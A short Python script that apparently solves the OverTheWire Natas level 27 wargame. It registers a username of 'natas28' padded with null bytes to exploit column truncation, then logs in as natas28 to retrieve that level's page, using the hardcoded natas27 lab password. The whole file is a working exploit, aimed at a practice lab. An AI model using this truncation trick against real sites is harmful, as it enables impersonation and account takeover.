import requests


# Credentials for natas27
username = "natas27"
password = "u3RRffXjysjgwFU6b9xa23i6prmUsYne"

# Target URL
url = "http://natas27.natas.labs.overthewire.org/index.php"

# Payload for the username.
# Null in python "\0" or "\x00"
null = "\0"*57
user = f"natas28{null}hack2"
payload = {
    "username": user,
    "password": ""
}

# Start a session to persist cookies and headers across requests
session = requests.Session()

# send POST request to create user
post_response = session.post(
    url,
    data=payload,
    auth=(username, password)
)

#print(post_response.text)
#print("="*80)

# send POST request to login as natas28
response = session.post(
    url,
    data={"username":"natas28", "password":""},
    auth=(username, password)
)

print(response.text)